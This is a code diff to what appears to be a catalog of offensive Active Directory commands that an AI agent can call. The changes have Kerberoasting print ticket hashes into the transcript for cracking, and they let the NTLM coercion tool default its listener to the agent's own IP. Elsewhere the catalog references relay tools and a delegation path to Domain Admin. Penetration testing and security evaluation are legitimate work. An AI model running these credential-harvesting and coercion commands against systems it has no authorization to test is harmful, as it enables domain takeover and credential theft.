@@ -29,6 +29,20 @@ def _s(v: Any) -> str:
     return str(v)
 
 
+def _local_ip_for(target: str) -> str:
+    """Source IP the OS would use to reach *target* (no packets sent). Used to
+    default a coercion/relay listener to our own address on the right interface."""
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((target, 9))
+        return s.getsockname()[0]
+    except OSError:
+        return ""
+    finally:
+        s.close()
+
+
 def _flag(args: list[str], kwargs: dict, key: str, flag: str) -> None:
     """Append `flag value` when the model supplied `key`."""
     if kwargs.get(key) not in (None, ""):
@@ -372,8 +386,10 @@ CATALOG: list[CommandSpec] = [
                     "cracking. Requires valid domain credentials.",
         binary="impacket-GetUserSPNs",
         parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
+        # No -outputfile: -request prints the $krb5tgs$ hashes to stdout so they are
+        # captured in the transcript (harvested for cracking AND detected as a finding).
         build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}",
-                              "-dc-ip", _s(k["target"]), "-request", "-outputfile", "spns.txt"],
+                              "-dc-ip", _s(k["target"]), "-request"],
         install_hint="pipx install impacket.",
     ),
     # ---- Resource-Based Constrained Delegation (RBCD) -> Domain Admin -------
@@ -544,9 +560,11 @@ CATALOG: list[CommandSpec] = [
                     "(your host). Pair with a running ntlmrelayx / responder.",
         binary="coercer", category="ad-smb",
         parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
-            "listener": {"type": "string", "description": "Attacker IP the target should authenticate to."}},
-            ["target", "listener"]),
-        build_args=lambda k: ["coerce", "-t", _s(k["target"]), "-l", _s(k["listener"])]
+            "listener": {"type": "string", "description": "Attacker IP the target should "
+                         "authenticate to. Defaults to our IP on the route to the target."}},
+            ["target"]),
+        build_args=lambda k: ["coerce", "-t", _s(k["target"]),
+                              "-l", _s(k.get("listener") or _local_ip_for(_s(k["target"])))]
                              + (["-u", _s(k["username"]), "-p", _s(k.get("password", "")),
                                  "-d", _s(k.get("domain", ""))] if k.get("username") else [])
                              + ["-v"],
